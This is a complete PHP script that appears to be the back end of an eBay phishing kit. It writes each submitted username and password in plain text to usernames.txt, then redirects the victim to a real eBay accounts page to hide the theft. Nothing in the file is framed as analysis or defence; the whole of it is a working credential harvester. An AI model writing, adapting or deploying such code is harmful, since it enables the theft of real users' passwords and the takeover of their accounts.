<?php

file_put_contents("usernames.txt", "Ebay Username: " . $_POST['userid'] . "\nPassword: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://accounts.ebay.com/acctxs/user');
exit();
?>